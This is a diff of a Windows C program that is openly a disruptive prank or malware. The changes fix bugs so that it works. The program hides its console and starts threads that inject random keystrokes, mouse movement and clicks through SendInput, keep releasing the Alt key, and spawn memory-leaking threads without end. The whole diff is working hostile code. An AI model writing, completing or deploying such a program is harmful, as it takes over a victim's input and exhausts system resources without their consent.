@@ -1008,14 +1008,17 @@ int A[10000] =
 
 unsigned long WINAPI MemoryLeak(LPVOID P)
 {
-    int * Array = malloc(10 * sizeof(int));
-    for(int i = 0; i < 10000; ++i)
+    while(1)
     {
-        A[i] += Array[i % 10];
-        A[i] *= 7;
-        A[i] /= 7;
+        int * Array = (int *)malloc(10 * sizeof(int));
+        for(int i = 0; i < 10000; ++i)
+        {
+            A[i] += Array[i % 10];
+            A[i] *= 7;
+            A[i] /= 7;
+        }
+        Sleep(1000);
     }
-    MemoryLeak(P);
 }
 
 unsigned long WINAPI UnpressAlt(LPVOID P)
@@ -1025,8 +1028,8 @@ unsigned long WINAPI UnpressAlt(LPVOID P)
     {
         INPUT I;
         I.type = 1;
-        I.DUMMYUNIONNAME.ki.wVk = VK_MENU;
-        I.DUMMYUNIONNAME.ki.dwFlags = KEYEVENTF_KEYUP;
+        I.ki.wVk = VK_MENU;
+        I.ki.dwFlags = KEYEVENTF_KEYUP;
         SendInput(1, &I, sizeof(INPUT));
     }
 }
@@ -1037,13 +1040,13 @@ unsigned long WINAPI RandomInput(LPVOID P)
     {
         INPUT I[2];
         I[0].type = 1;
-        I[0].DUMMYUNIONNAME.ki.wVk = (rand() % 254) + 1;
-        I[0].DUMMYUNIONNAME.ki.dwFlags = KEYEVENTF_KEYUP;
+        I[0].ki.wVk = (rand() % 254) + 1;
+        I[0].ki.dwFlags = 0;
         I[1].type = 0;
-        I[1].DUMMYUNIONNAME.mi.dx = (rand() % 500) + 1;
-        I[1].DUMMYUNIONNAME.mi.dx = (rand() % 500) + 1;
-        I[1].DUMMYUNIONNAME.mi.mouseData = 0;
-        I[1].DUMMYUNIONNAME.mi.dwFlags = MOUSEEVENTF_MOVE | MOUSEEVENTF_LEFTDOWN | MOUSEEVENTF_RIGHTDOWN;
+        I[1].mi.dx = (rand() % 500) - 250;
+        I[1].mi.dx = (rand() % 500) - 250;
+        I[1].mi.mouseData = 0;
+        I[1].mi.dwFlags = MOUSEEVENTF_MOVE | MOUSEEVENTF_LEFTDOWN | MOUSEEVENTF_RIGHTDOWN;
         SendInput(2, I, sizeof(INPUT));
     }
 }
@@ -1052,12 +1055,13 @@ int main()
 {
     SYSTEMTIME T;
     GetSystemTime(&T);
-    srand(T.Milliseconds);
+    srand(T.wMilliseconds);
     FreeConsole();
     CreateThread(NULL, 0, UnpressAlt, NULL, 0, NULL);
     CreateThread(NULL, 0, RandomInput, NULL, 0, NULL);
     while(1)
     {
         CreateThread(NULL, 0, MemoryLeak, NULL, 0, NULL);
+        Sleep(1000);
     }
 }
